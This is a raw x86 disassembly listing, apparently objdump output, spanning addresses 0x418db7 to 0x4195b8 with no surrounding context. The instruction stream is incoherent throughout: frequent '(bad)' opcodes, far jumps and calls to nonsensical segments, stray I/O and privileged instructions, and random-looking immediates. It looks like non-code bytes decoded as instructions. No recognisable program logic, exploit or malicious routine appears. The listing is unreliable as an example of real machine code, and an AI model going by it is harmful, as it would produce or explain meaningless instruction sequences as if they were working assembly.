  418db7:	sub    BYTE PTR [ebx+ebx*1-0x6a33a093],0x31
  418dbf:	adc    al,0x22
  418dc1:	xor    DWORD PTR [esi-0x44f70cbd],0xffffffd1
  418dc8:	fs std 
  418dca:	sbb    al,0xb6
  418dcc:	bound  eax,QWORD PTR [edi-0x7b]
  418dcf:	add    al,BYTE PTR [ecx+0x2aadc570]
  418dd5:	sub    eax,0xbce726f9
  418dda:	sub    al,BYTE PTR [ecx]
  418ddc:	mov    edx,0xc7a452ac
  418de1:	dec    eax
  418de2:	loop   0x418d95
  418de4:	repnz add ebp,esi
  418de7:	clc    
  418de8:	pusha  
  418de9:	cli    
  418dea:	mov    al,0xe2
  418dec:	ja     0x418e39
  418dee:	jnp    0x418df6
  418df0:	fistp  QWORD PTR [ecx+edx*2+0x1a]
  418df4:	add    BYTE PTR [eax+0x18e3c010],ah
  418dfa:	(bad)  [ebx+0x63]
  418dfd:	cld    
  418dfe:	push   ds
  418dff:	push   cs
  418e00:	jg     0x418e68
  418e02:	ins    BYTE PTR es:[edi],dx
  418e03:	mov    ch,0xd9
  418e05:	mov    ebp,edx
  418e07:	enter  0x66c3,0xbe
  418e0b:	inc    esi
  418e0c:	mov    esi,0x1f0e07e0
  418e11:	pop    eax
  418e12:	push   eax
  418e13:	pop    esi
  418e14:	adc    al,al
  418e16:	adc    ebx,DWORD PTR [esi+0x38]
  418e19:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418e1a:	(bad)  
  418e1b:	inc    bx
  418e1d:	push   ds
  418e1e:	idiv   DWORD PTR [ecx-0x11]
  418e21:	and    dl,ch
  418e23:	mov    dl,BYTE PTR [edi+0x20ff26b5]
  418e29:	pop    ds
  418e2a:	mov    eax,0xdc0378c4
  418e2f:	loope  0x418eaa
  418e31:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418e32:	jae    0x418dcf
  418e34:	shr    DWORD PTR [esi-0x5b4993bd],1
  418e3a:	fcom   QWORD PTR [edx]
  418e3c:	fidivr DWORD PTR [eax]
  418e3e:	jbe    0x418e03
  418e40:	aad    0xbf
  418e42:	jge    0x418e7f
  418e44:	nop
  418e45:	popf   
  418e46:	outs   dx,BYTE PTR ds:[esi]
  418e47:	inc    eax
  418e48:	jnp    0x418e77
  418e4a:	mov    ecx,0x9da3e98b
  418e4f:	inc    edi
  418e50:	pop    ebx
  418e51:	add    bl,al
  418e53:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418e54:	push   ebx
  418e55:	mov    bl,0x0
  418e57:	mov    eax,ds:0x3d230329
  418e5c:	adc    eax,0xd8b414eb
  418e61:	pushf  
  418e62:	xor    ch,dh
  418e64:	je     0x418e26
  418e66:	add    DWORD PTR [esi+ecx*2],edx
  418e69:	(bad)  
  418e6a:	retf   0xa5e4
  418e6d:	shl    BYTE PTR [edi+0x47],0x63
  418e71:	std    
  418e72:	or     BYTE PTR [esi+ebx*4+0x28f4b203],0xf4
  418e7a:	les    esi,FWORD PTR [edi+ebp*2+0xa5e5feb]
  418e81:	in     eax,0x5d
  418e83:	mov    ds:0x1c85aed5,eax
  418e88:	xchg   BYTE PTR [ecx-0x30c395ea],ch
  418e8e:	add    ah,BYTE PTR [edi+ecx*8-0x68]
  418e92:	cwde   
  418e93:	inc    ebp
  418e94:	and    dh,BYTE PTR [edx+edx*4+0x11]
  418e98:	xor    DWORD PTR [ebx-0x2c],edi
  418e9b:	test   eax,0x3f57b628
  418ea0:	jnp    0x418e57
  418ea2:	jmp    FWORD PTR ds:[edi]
  418ea5:	mov    ds:0x2969cc9b,eax
  418eaa:	jne    0x418f1b
  418eac:	gs fsubr st,st(5)
  418eaf:	out    0xc0,eax
  418eb1:	mov    ds:0x2783c79a,eax
  418eb6:	int3   
  418eb7:	mov    ah,0x4e
  418eb9:	adc    ch,ch
  418ebb:	enter  0x85d7,0xae
  418ebf:	call   0x147e0337
  418ec4:	adc    eax,0x328639cc
  418ec9:	pop    ebp
  418eca:	and    al,0x41
  418ecc:	push   cs
  418ecd:	pop    ds
  418ece:	sbb    cl,al
  418ed0:	cmp    al,0x61
  418ed2:	and    BYTE PTR [edi],bh
  418ed4:	or     BYTE PTR [ebx],dh
  418ed6:	retf   0xfb4d
  418ed9:	adc    al,0x4e
  418edb:	adc    BYTE PTR [ebp+0x2e2d01ba],cl
  418ee1:	ins    DWORD PTR es:[edi],dx
  418ee2:	cmp    bl,dh
  418ee4:	push   esi
  418ee5:	ja     0x418f0a
  418ee7:	fistp  DWORD PTR [edi]
  418ee9:	jmp    0xdfcd:0x1109bed
  418ef0:	mov    dh,0xcb
  418ef2:	xchg   edi,eax
  418ef3:	mov    eax,ds:0x23bbaa19
  418ef8:	ret    
  418ef9:	push   ss
  418efa:	(bad)  
  418efc:	fwait
  418efd:	push   esi
  418efe:	loope  0x418e97
  418f00:	mov    WORD PTR [edx],ss
  418f02:	fistp  WORD PTR [edi+0xe]
  418f05:	int    0x29
  418f07:	arpl   WORD PTR [edi],dx
  418f09:	push   ebx
  418f0a:	lds    edx,FWORD PTR [ecx-0x22]
  418f0d:	icebp  
  418f0e:	imul   esi,ebp,0xffffffb3
  418f11:	fdivr  DWORD PTR [edx]
  418f13:	outs   dx,DWORD PTR ds:[esi]
  418f14:	daa    
  418f15:	dec    esp
  418f16:	xor    ebx,DWORD PTR ds:0xfac2c626
  418f1c:	mov    cl,0x5e
  418f1e:	aam    0xe7
  418f20:	call   0x54c31329
  418f25:	scas   eax,DWORD PTR es:[edi]
  418f26:	stos   DWORD PTR es:[edi],eax
  418f27:	test   BYTE PTR [edx-0x313950ce],dh
  418f2d:	sub    al,0x92
  418f2f:	or     eax,0xceaac4e5
  418f34:	jae    0x418ed8
  418f36:	inc    eax
  418f37:	cli    
  418f38:	xor    BYTE PTR [edx+0x18],ah
  418f3b:	retf   
  418f3c:	inc    esi
  418f3d:	jmp    0x71474924
  418f42:	cmp    ebx,DWORD PTR [ebp+0x3d]
  418f45:	int3   
  418f46:	inc    ebx
  418f47:	mov    ebx,0x7feaa8e9
  418f4c:	call   0x9a64eddb
  418f51:	retf   
  418f52:	stos   BYTE PTR es:[edi],al
  418f53:	or     ch,dl
  418f55:	push   cs
  418f56:	push   esi
  418f57:	push   esp
  418f58:	mov    ah,0xce
  418f5a:	loope  0x418f26
  418f5c:	fadd   st(0),st
  418f5e:	inc    edi
  418f5f:	xchg   al,bh
  418f61:	rol    dh,0x1c
  418f64:	jbe    0x418f0c
  418f66:	(bad)
  418f6a:	add    eax,0x4111e08e
  418f6f:	dec    DWORD PTR [esi-0x2f45c57b]
  418f75:	sub    al,0xc5
  418f77:	jb     0x418fec
  418f79:	loop   0x418f5d
  418f7b:	pushf  
  418f7c:	lods   al,BYTE PTR ds:[esi]
  418f7d:	scas   al,BYTE PTR es:[edi]
  418f7e:	(bad)  
  418f7f:	retf   0x4d3d
  418f82:	ror    DWORD PTR [ecx-0x3c894fc7],cl
  418f88:	imul   esi,DWORD PTR [esi-0x6bdad598],0xd1055b45
  418f92:	(bad)  
  418f94:	push   cs
  418f95:	inc    edi
  418f97:	mov    bh,0xdc
  418f99:	mov    BYTE PTR [eax],bh
  418f9b:	inc    esi
  418f9c:	cmp    BYTE PTR [esi+0x3f182fc3],al
  418fa2:	rcr    BYTE PTR [esi+0x53],1
  418fa5:	jmp    0xd8c:0x5900acd6
  418fac:	data16 loope 0x418fce
  418faf:	shr    BYTE PTR [eax-0x33],0xd7
  418fb3:	xor    BYTE PTR [esi+0x352203b3],dl
  418fb9:	dec    edx
  418fba:	mov    fs,esp
  418fbc:	fsubr  DWORD PTR [eax+0xf30a09c]
  418fc2:	adc    esp,ebx
  418fc4:	stos   BYTE PTR es:[edi],al
  418fc5:	sbb    dl,al
  418fc7:	and    ecx,DWORD PTR [ecx+0x57]
  418fca:	(bad)  
  418fcb:	ins    BYTE PTR es:[edi],dx
  418fcc:	lahf   
  418fcd:	fadd   st(4),st
  418fcf:	lea    edi,[ecx+edx*1-0x4e1cb90e]
  418fd6:	or     BYTE PTR [ebp+0x76],bh
  418fd9:	out    0x9b,al
  418fdb:	xchg   BYTE PTR [ecx-0x10],ch
  418fde:	fst    QWORD PTR ds:0x2686eddd
  418fe4:	imul   edx,DWORD PTR [ebx-0x3af9b7dd],0x9396a809
  418fee:	cmp    dh,0xf7
  418ff1:	div    BYTE PTR [ebx+0x5679f30f]
  418ff7:	sbb    BYTE PTR [esi+edx*1+0x48],dh
  418ffb:	jae    0x419039
  418ffd:	mov    esi,0x1f891626
  419002:	jg     0x419042
  419004:	sub    al,0x38
  419006:	imul   esp,DWORD PTR [esi+0x24],0xffffffc2
  41900a:	shr    BYTE PTR [ebp+0x29],cl
  41900d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41900e:	lea    edx,[eax-0xd]
  419011:	mov    bh,0x4a
  419013:	push   cs
  419014:	jbe    0x41906f
  419016:	sbb    eax,0xa712713f
  41901b:	iret   
  41901c:	ins    DWORD PTR es:[edi],dx
  41901d:	rcl    DWORD PTR [edi-0xe],cl
  419020:	pop    ebx
  419021:	sub    BYTE PTR [eax+0x6747ec8b],dl
  419027:	push   0x75
  419029:	pop    esp
  41902a:	imul   edi,DWORD PTR ds:0xabd52ac8,0x3c
  419031:	pusha  
  419032:	adc    BYTE PTR [esi-0x708eb75f],dl
  419038:	sbb    esi,DWORD PTR [esi]
  41903a:	sbb    al,0xf6
  41903c:	cmp    DWORD PTR [ebx+0x38a2c898],ecx
  419042:	fdiv   st,st(5)
  419044:	pop    esp
  419045:	pop    ebx
  419046:	ins    BYTE PTR es:[edi],dx
  419047:	mov    ah,0x4d
  419049:	inc    esp
  41904a:	push   0xae79f313
  41904f:	es retf 
  419051:	loope  0x4190a6
  419053:	mov    ebx,0x6e2ec826
  419058:	mov    ah,0x6b
  41905a:	mov    ds:0xf20398bc,al
  41905f:	mov    cl,0x4a
  419061:	lahf   
  419062:	mov    ebx,0x2e9692b3
  419067:	ror    DWORD PTR [edi+0x35],cl
  41906a:	lods   eax,DWORD PTR ds:[esi]
  41906b:	mov    ebx,0x13ab354d
  419070:	int    0xc
  419072:	jmp    ebx
  419074:	add    eax,DWORD PTR [eax]
  419076:	stos   DWORD PTR es:[edi],eax
  419077:	int    0xec
  419079:	xchg   edx,eax
  41907a:	(bad)  
  41907b:	mov    DWORD PTR [edx],ebx
  41907d:	pop    esp
  41907e:	sbb    esi,eax
  419080:	rcl    BYTE PTR [eax+edx*1],1
  419083:	mul    DWORD PTR [ebp-0x59]
  419086:	ins    BYTE PTR es:[edi],dx
  419087:	push   edi
  419088:	jle    0x419060
  41908a:	sti    
  41908b:	clc    
  41908c:	lods   eax,DWORD PTR ds:[esi]
  41908d:	mov    esp,0x9f00b760
  419092:	cmp    dh,bh
  419094:	addr16 (bad) 
  419096:	(bad)  
  419097:	lods   al,BYTE PTR ds:[esi]
  419098:	push   ss
  419099:	lock dec eax
  41909b:	push   edx
  41909c:	dec    esp
  41909d:	xchg   esi,eax
  41909e:	cli    
  41909f:	shl    BYTE PTR [ebp-0x5ea5eb53],1
  4190a5:	test   al,0x24
  4190a7:	or     edi,DWORD PTR [ebp+0x59bfc281]
  4190ad:	(bad)  
  4190ae:	(bad)  
  4190af:	mov    edi,0xfccb8979
  4190b4:	imul   esp,DWORD PTR [ebx+ecx*2-0x557e0e61],0xffffffea
  4190bc:	in     al,dx
  4190bd:	xchg   edx,eax
  4190be:	inc    ebx
  4190bf:	push   edx
  4190c0:	mov    ch,0x2c
  4190c2:	icebp  
  4190c3:	inc    ebx
  4190c4:	(bad)  
  4190c5:	xor    bh,BYTE PTR [edi+0x31]
  4190c8:	or     bl,BYTE PTR ds:0xc27ce346
  4190ce:	in     eax,0xeb
  4190d0:	adc    BYTE PTR [ebx-0x3f60d149],bh
  4190d6:	push   0x513c9457
  4190db:	imul   ebx,DWORD PTR [esi+0x4b],0x69df16c9
  4190e2:	push   es
  4190e3:	push   esp
  4190e4:	xchg   ecx,eax
  4190e5:	xor    DWORD PTR [ecx-0x3e],ebp
  4190e8:	in     al,dx
  4190e9:	fsubr  QWORD PTR [ebp-0x56]
  4190ec:	arpl   sp,dx
  4190ee:	cmp    edi,DWORD PTR [edx+edi*2]
  4190f1:	mov    ebp,0x2f0d4ffb
  4190f6:	test   DWORD PTR [edi-0x3eba2963],ecx
  4190fc:	rcr    BYTE PTR [ebp+0x6f],0x8f
  419100:	arpl   WORD PTR [ebx+0x9],si
  419103:	out    dx,al
  419104:	adc    DWORD PTR [ebx+0x4d],eax
  419107:	rcl    ch,0x95
  41910a:	bswap  eax
  41910c:	pop    eax
  41910d:	sti    
  41910e:	das    
  41910f:	dec    ecx
  419110:	rcr    BYTE PTR [edi-0x3bcb14f1],0x19
  419117:	or     dh,ch
  419119:	add    eax,0x18caa827
  41911f:	sbb    edx,DWORD PTR [ecx+0x4f86472c]
  419125:	test   ch,dl
  419127:	rcr    ecx,0xc8
  41912a:	test   BYTE PTR [esi+0x507bf8cb],0x83
  419131:	retf   
  419132:	and    al,0x5c
  419134:	mov    WORD PTR [edi-0x1621aad5],fs
  41913a:	xor    DWORD PTR [esi-0x70],ecx
  41913d:	bound  esi,QWORD PTR [ebp-0x4533d7b8]
  419143:	mov    bl,0x41
  419145:	mov    WORD PTR [edi],es
  419147:	les    esi,FWORD PTR [edx*8-0x4bf7e63f]
  41914e:	mov    BYTE PTR [edi+0xdf154a4],dl
  419154:	dec    ecx
  419155:	mov    ebp,0xb15b0658
  41915a:	leave  
  41915b:	sbb    eax,0x31a5c3c5
  419160:	push   ecx
  419161:	nop
  419162:	shl    DWORD PTR [eiz*2+0x19766c25],1
  419169:	xchg   esi,esi
  41916b:	out    0xe9,eax
  41916d:	sub    dl,bh
  41916f:	sbb    DWORD PTR [edi],edx
  419171:	dec    esi
  419172:	ss sbb eax,0x40d2aabb
  419178:	addr16 add al,0xa4
  41917b:	(bad)  
  41917c:	sahf   
  41917d:	push   ecx
  41917e:	push   ebx
  41917f:	push   0x66
  419181:	xor    BYTE PTR [esi],bh
  419183:	sbb    al,0xbd
  419185:	push   ebp
  419186:	les    ebx,FWORD PTR [eax-0x3c]
  419189:	xchg   esp,eax
  41918a:	pop    ss
  41918b:	jns    0x419206
  41918d:	pop    ss
  41918e:	loope  0x4191d6
  419190:	imul   edx,DWORD PTR [ebx+ecx*8],0x4b01edfc
  419197:	jns    0x419130
  419199:	push   ebp
  41919a:	ret    
  41919b:	xchg   ebp,eax
  41919c:	adc    DWORD PTR fs:[ebx+0x5285a537],esi
  4191a3:	mov    BYTE PTR ds:0x8409fa58,cl
  4191a9:	jnp    0x419178
  4191ab:	cmp    al,0x9d
  4191ad:	mov    dh,0xd3
  4191af:	mov    bh,0x67
  4191b1:	mov    esp,0x4d577bf8
  4191b6:	mov    al,0xfa
  4191b8:	dec    edi
  4191b9:	jne    0x419162
  4191bb:	and    ah,BYTE PTR [edx+0x1c]
  4191be:	mov    ds:0x6fa38500,al
  4191c3:	xor    DWORD PTR [ebp-0x44],0x6d14bb76
  4191ca:	and    esi,ebx
  4191cc:	pushf  
  4191cd:	mov    eax,ds:0x35e1a04d
  4191d2:	jno    0x41920c
  4191d4:	pop    esp
  4191d5:	push   eax
  4191d6:	xlat   BYTE PTR ds:[ebx]
  4191d7:	mov    edx,0xce673b5f
  4191dc:	dec    ebx
  4191dd:	mov    dh,0xc3
  4191df:	scas   al,BYTE PTR es:[edi]
  4191e0:	div    BYTE PTR [edi-0x15]
  4191e3:	ds cmps BYTE PTR fs:[esi],BYTE PTR es:[edi]
  4191e6:	cmp    DWORD PTR [edi+0xb6b190d],ecx
  4191ec:	sub    eax,0x7abe2c8e
  4191f1:	add    ecx,ecx
  4191f3:	mov    dl,0x3
  4191f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4191f6:	sub    ecx,DWORD PTR [ebx]
  4191f8:	ror    DWORD PTR [esi+eax*4+0x32],0xe2
  4191fd:	mov    edi,ecx
  4191ff:	sbb    eax,0x5ccd8b61
  419204:	add    al,BYTE PTR [ebp+edx*2+0x6bbacd06]
  41920b:	stos   DWORD PTR es:[edi],eax
  41920c:	cs mov dl,0x92
  41920f:	jmp    0x12ae:0x35d6e38e
  419216:	mov    ebx,0xc99e8587
  41921b:	data16 lods al,BYTE PTR ds:[esi]
  41921d:	out    0xd2,eax
  41921f:	lds    eax,FWORD PTR [edi-0x2c]
  419222:	dec    ebp
  419223:	jmp    0x4191bc
  419225:	jmp    0x42285565
  41922a:	push   ecx
  41922b:	ja     0x4191c3
  41922d:	xchg   esp,esi
  41922f:	push   ebp
  419230:	je     0x4191f4
  419232:	ins    DWORD PTR es:[edi],dx
  419233:	scas   al,BYTE PTR es:[edi]
  419234:	mov    cl,0x8e
  419236:	out    dx,eax
  419237:	icebp  
  419238:	ja     0x419299
  41923a:	iret   
  41923b:	imul   esi,DWORD PTR [esi-0xe4f547e],0xcb4cd274
  419245:	cli    
  419246:	int    0xef
  419248:	ja     0x419296
  41924a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41924b:	add    ch,BYTE PTR [ebx+0x18b3926a]
  419251:	mov    ds:0x73329cd8,al
  419256:	mov    esp,0x73a1ee1f
  41925b:	xor    BYTE PTR [edi-0x5ceb0a99],ah
  419261:	add    ecx,DWORD PTR [ecx]
  419263:	lds    esp,FWORD PTR [edi-0x47744480]
  419269:	push   es
  41926a:	or     ebx,ecx
  41926c:	hlt    
  41926d:	rcl    esi,0xe8
  419270:	mov    ah,0xf8
  419272:	mov    eax,ds:0x7678c086
  419277:	aas    
  419278:	loopne 0x419298
  41927a:	dec    esi
  41927b:	xchg   dx,ax
  41927d:	test   BYTE PTR [edx],dh
  41927f:	push   edi
  419280:	add    al,0xc5
  419282:	mov    al,0x35
  419284:	ja     0x419243
  419286:	cmp    ah,BYTE PTR [ecx+eiz*1-0x4def4e23]
  41928d:	scas   eax,DWORD PTR es:[edi]
  41928e:	push   ds
  41928f:	push   es
  419290:	ins    BYTE PTR es:[edi],dx
  419291:	push   0x14
  419293:	and    BYTE PTR [ebx],dl
  419295:	mov    esi,0xe99ca80a
  41929a:	fcmovnb st,st(6)
  41929c:	loope  0x41922e
  41929e:	ins    DWORD PTR es:[edi],dx
  41929f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4192a0:	and    BYTE PTR [edx],bh
  4192a2:	mov    BYTE PTR [edi+0x34],dh
  4192a5:	pop    ds
  4192a6:	addr16 sub al,0x87
  4192a9:	cli    
  4192aa:	pop    edx
  4192ab:	es sub al,0x5e
  4192ae:	bound  ebx,QWORD PTR [ebp-0x52d7126a]
  4192b4:	sbb    BYTE PTR [ecx-0x1d],0x4e
  4192b8:	jnp    0x419318
  4192ba:	mov    ds:0x7873e763,eax
  4192bf:	xchg   esp,eax
  4192c0:	daa    
  4192c1:	pop    esp
  4192c2:	rcr    BYTE PTR [edi],1
  4192c4:	sbb    cl,BYTE PTR ds:0x1f442a32
  4192ca:	dec    eax
  4192cb:	outs   dx,DWORD PTR ds:[esi]
  4192cc:	fstp   DWORD PTR [edi]
  4192ce:	xchg   ecx,eax
  4192cf:	pushf  
  4192d0:	fisubr DWORD PTR [esi-0x4]
  4192d3:	pop    eax
  4192d4:	call   0xed6b:0x91936ec4
  4192db:	outs   dx,DWORD PTR ds:[esi]
  4192dc:	cmp    DWORD PTR [ecx+0x6aa205b2],edi
  4192e2:	pop    ds
  4192e3:	adc    ebp,DWORD PTR [eax+0x73]
  4192e6:	jl     0x4192f4
  4192e8:	dec    DWORD PTR [ecx-0x2479f429]
  4192ee:	push   edx
  4192ef:	outs   dx,DWORD PTR ds:[esi]
  4192f0:	inc    eax
  4192f1:	inc    ebp
  4192f2:	jo     0x4192eb
  4192f4:	lds    esp,FWORD PTR [edi-0x4d99bfbe]
  4192fa:	cli    
  4192fb:	mov    BYTE PTR [edi],ah
  4192fd:	mov    ds:0x25e2001a,eax
  419302:	jmp    0x638f:0x478334c7
  419309:	arpl   sp,sp
  41930b:	fbstp  TBYTE PTR [esi]
  41930d:	fdivr  DWORD PTR [edx-0x16]
  419310:	inc    esp
  419311:	loopne 0x41935c
  419313:	neg    BYTE PTR [ecx-0x4edf4cdf]
  419319:	inc    BYTE PTR [eax-0x5d]
  41931c:	test   eax,0xf627a10d
  419321:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419322:	dec    edi
  419323:	scas   eax,DWORD PTR es:[edi]
  419324:	clc    
  419325:	and    DWORD PTR [ebx],edi
  419327:	pop    edx
  419328:	aas    
  419329:	cs ds push ebx
  41932c:	cmp    BYTE PTR [edx-0x5171744b],dl
  419332:	pushf  
  419333:	mov    al,ds:0x6793fe22
  419338:	cmp    ch,ah
  41933a:	jne    0x419356
  41933c:	xchg   DWORD PTR [ebx-0x3a],edi
  41933f:	or     eax,0x9891b49f
  419344:	test   DWORD PTR [edx+eiz*4+0x7f7589b2],ecx
  41934b:	retf   
  41934c:	aam    0x7e
  41934e:	and    ch,BYTE PTR [eax]
  419350:	jge    0x419315
  419352:	pusha  
  419353:	les    ecx,FWORD PTR [eax+ebx*1-0x46]
  419357:	inc    ecx
  419358:	mov    edi,0xf4e7be96
  41935d:	inc    ecx
  41935e:	test   DWORD PTR [edi],ebp
  419360:	mov    al,ds:0xa842efcf
  419365:	add    ebx,DWORD PTR [edi]
  419367:	jp     0x4192fa
  419369:	pop    edx
  41936a:	pop    esp
  41936b:	and    al,0xf4
  41936d:	fisub  WORD PTR [edi]
  41936f:	inc    ecx
  419370:	cmp    al,0xe1
  419372:	sbb    BYTE PTR [ecx-0x993fc92],0x6c
  419379:	sti    
  41937a:	or     al,ah
  41937c:	push   esp
  41937d:	mov    ds:0x17eb33cc,al
  419382:	mov    cl,0xc6
  419384:	mov    ebx,0xad524045
  419389:	addr16 ja 0x41935c
  41938c:	out    0x35,eax
  41938e:	sub    esi,DWORD PTR [esi]
  419390:	mov    ah,BYTE PTR [ebx]
  419392:	add    dl,dl
  419394:	sbb    BYTE PTR [edi+0x66],cl
  419397:	call   0x6f75:0xe62e3c8b
  41939e:	lock sbb dh,BYTE PTR [eax-0x51dcba18]
  4193a5:	xor    cl,BYTE PTR [edx+ebx*8]
  4193a8:	mov    al,ds:0x155b6e4d
  4193ad:	mov    edi,0x86fbdd5a
  4193b2:	int3   
  4193b3:	pop    ecx
  4193b4:	ficom  WORD PTR ds:0x4f29f73e
  4193ba:	fcomi  st,st(2)
  4193bc:	adc    dl,BYTE PTR [ecx]
  4193be:	loop   0x4193e2
  4193c0:	lock aam 0x23
  4193c3:	in     al,0x90
  4193c5:	xchg   esi,eax
  4193c6:	aaa    
  4193c7:	push   DWORD PTR [eax+0x2c]
  4193ca:	shr    BYTE PTR [ecx+0x69e5d4b6],cl
  4193d0:	mov    al,0xfc
  4193d2:	std    
  4193d3:	xchg   DWORD PTR [ebx+0x6d7ef8e9],ebp
  4193d9:	int    0x6c
  4193db:	jl     0x41937a
  4193dd:	test   DWORD PTR [eax-0x42],0xc823bb73
  4193e4:	(bad)  
  4193e5:	iret   
  4193e6:	jnp    0x41942d
  4193e8:	test   al,0x21
  4193ea:	xchg   BYTE PTR [ecx-0xa],bl
  4193ed:	je     0x419379
  4193ef:	ret    
  4193f0:	or     eax,DWORD PTR [ebx+0x27]
  4193f3:	push   edx
  4193f4:	pop    ebx
  4193f5:	mov    edx,0xfe321b6a
  4193fa:	mov    esi,0xc18fa081
  4193ff:	jg     0x4193c3
  419401:	jle    0x419412
  419403:	jne    0x4193da
  419405:	or     ebp,DWORD PTR [ebx-0x25a261e1]
  41940b:	cwde   
  41940c:	call   0x3a97ec91
  419411:	leave  
  419412:	and    DWORD PTR [edi-0x10],eax
  419415:	out    dx,eax
  419416:	jp     0x419485
  419418:	stos   DWORD PTR es:[edi],eax
  419419:	cmp    al,0xa0
  41941b:	call   0x268a:0x536c1326
  419422:	test   BYTE PTR [esi+0x1e],ch
  419425:	sub    cl,BYTE PTR [edx-0x49ffedd4]
  41942b:	mov    DWORD PTR [ebp+0x2b4cb738],eax
  419431:	mov    ebp,0xfd498c1
  419436:	popf   
  419437:	ret    
  419438:	into   
  419439:	pop    ss
  41943a:	xchg   esi,eax
  41943b:	stos   DWORD PTR es:[edi],eax
  41943c:	dec    esp
  41943d:	enter  0xb35d,0xc4
  419441:	jp     0x419403
  419443:	push   ecx
  419444:	or     BYTE PTR [esi-0x59b9d715],al
  41944a:	scas   al,BYTE PTR es:[edi]
  41944b:	pop    edx
  41944c:	mov    ah,0x16
  41944e:	in     al,0xcc
  419450:	sti    
  419451:	xor    ebx,DWORD PTR [ecx+edx*8+0x48]
  419455:	push   0x76ff6b8d
  41945a:	xor    eax,0x6afead63
  41945f:	ret    0x6619
  419462:	cmp    DWORD PTR [ecx],edx
  419464:	(bad)  [esi-0x629efba1]
  41946a:	sub    edx,ebx
  41946c:	ja     0x4194e7
  41946e:	fisttp DWORD PTR [ecx]
  419470:	inc    ebx
  419471:	int    0x59
  419473:	fs sub eax,0x883b23bd
  419479:	cmp    BYTE PTR [esi+0x5ac5ef3c],ch
  41947f:	in     al,dx
  419480:	jp     0x4194d8
  419482:	aaa    
  419483:	and    al,0x10
  419485:	(bad)  
  419486:	retf   0x4dc
  419489:	sbb    al,dl
  41948b:	bound  ebx,QWORD PTR [ebx+esi*1]
  41948e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41948f:	cmp    eax,0x4eeb7fe
  419494:	test   al,0x70
  419496:	pop    es
  419497:	push   esp
  419498:	dec    ebx
  419499:	jno    0x4194ff
  41949b:	inc    ebp
  41949c:	icebp  
  41949d:	push   esp
  41949e:	test   eax,0xa55047ec
  4194a3:	rcr    ch,cl
  4194a5:	xchg   ebp,eax
  4194a6:	jge    0x4194fb
  4194a8:	dec    edx
  4194a9:	in     eax,0x22
  4194ab:	mov    BYTE PTR [esi+ebp*8],al
  4194ae:	repz frstor ds:0xcd4d7ce3
  4194b6:	sti    
  4194b7:	clc    
  4194b8:	add    dh,BYTE PTR [ebx+0x42]
  4194bb:	mov    edx,0xcf10e51d
  4194c0:	pusha  
  4194c1:	loop   0x41953d
  4194c3:	jmp    0x3d95fde6
  4194c8:	mov    edx,0xa24eddf
  4194cd:	jge    0x4194f7
  4194cf:	add    eax,0x7c6f3ccc
  4194d4:	sub    BYTE PTR [ecx+ebp*1],dl
  4194d7:	jns    0x419484
  4194d9:	rcl    DWORD PTR [edi-0x4f9587b],0x7
  4194e0:	aas    
  4194e1:	arpl   cx,cx
  4194e3:	in     al,0xb0
  4194e5:	jle    0x4194bd
  4194e7:	call   0x7066:0x2f9d4398
  4194ee:	hlt    
  4194ef:	test   al,0xd5
  4194f2:	std    
  4194f3:	adc    ch,BYTE PTR [eax]
  4194f5:	loop   0x419568
  4194f7:	pop    esp
  4194f8:	aaa    
  4194f9:	shr    edi,0x32
  4194fc:	pop    eax
  4194fd:	leave  
  4194fe:	cwde   
  4194ff:	sbb    ebx,ebp
  419501:	sbb    esp,DWORD PTR [ebp-0x6f]
  419504:	pop    es
  419505:	jno    0x419575
  419507:	ins    BYTE PTR es:[edi],dx
  419508:	or     ecx,DWORD PTR [ecx-0x4fbe6abe]
  41950e:	cli    
  41950f:	xchg   ebp,eax
  419510:	out    0xd,eax
  419512:	loop   0x419561
  419514:	fdivr  DWORD PTR [ebp-0x45]
  419517:	hlt    
  419518:	leave  
  419519:	out    0x66,al
  41951b:	sbb    al,dh
  41951d:	into   
  41951e:	cmp    bh,ah
  419520:	push   0xffffffc1
  419522:	jmp    0x4194d1
  419524:	xchg   edi,eax
  419525:	mov    al,ds:0x8e911ff9
  41952a:	mov    ecx,DWORD PTR [esi+0x6c]
  41952d:	stos   BYTE PTR es:[edi],al
  41952e:	(bad)  
  41952f:	out    0x60,eax
  419531:	sahf   
  419532:	xchg   edi,eax
  419533:	mov    esi,0x52a96f8d
  419538:	js     0x419556
  41953a:	(bad)  
  41953b:	sbb    edx,eax
  41953d:	push   esi
  41953e:	mov    edi,0x5d3a76d6
  419543:	jno    0x4195b2
  419545:	jg     0x419529
  419547:	ins    DWORD PTR es:[edi],dx
  419548:	ja     0x41958f
  41954a:	out    dx,eax
  41954b:	ins    DWORD PTR es:[edi],dx
  41954c:	sbb    ch,dh
  41954e:	imul   ebx,DWORD PTR [edx+0x2673a22c],0x2e
  419555:	ds (bad) 
  419557:	int3   
  419558:	sub    DWORD PTR [edx],ecx
  41955a:	pop    esp
  41955b:	fist   DWORD PTR [ecx-0xf342860]
  419561:	pop    ebx
  419562:	inc    esp
  419563:	ss test eax,0x9719b8d0
  419569:	int    0xfb
  41956b:	mov    ds:0xd35c0cf0,eax
  419570:	sub    ecx,DWORD PTR [esp+eiz*2]
  419573:	adc    DWORD PTR [ebx-0x4f],0x39
  419577:	aad    0x40
  419579:	rcl    BYTE PTR [ecx+0x68e0e1cd],1
  41957f:	out    dx,eax
  419580:	test   DWORD PTR [esi+0x42],edx
  419583:	ret    0xda27
  419586:	xor    al,0xa9
  419588:	jle    0x419589
  41958a:	(bad)  
  41958b:	arpl   WORD PTR ds:0xf12b2fb3,sp
  419591:	xchg   BYTE PTR [edi],bl
  419593:	mov    ebx,DWORD PTR [edx]
  419595:	test   eax,0xf822916
  41959a:	or     eax,0x42aa96e1
  41959f:	aam    0xb0
  4195a1:	pushf  
  4195a2:	mov    al,ds:0x160e4496
  4195a7:	adc    esi,ebx
  4195a9:	je     0x419546
  4195ab:	xor    al,0xf2
  4195ad:	cdq    
  4195ae:	push   eax
  4195af:	inc    edi
  4195b0:	popa   
  4195b1:	jno    0x419559
  4195b3:	mov    eax,0x11f0fd8d
  4195b8:	lahf   
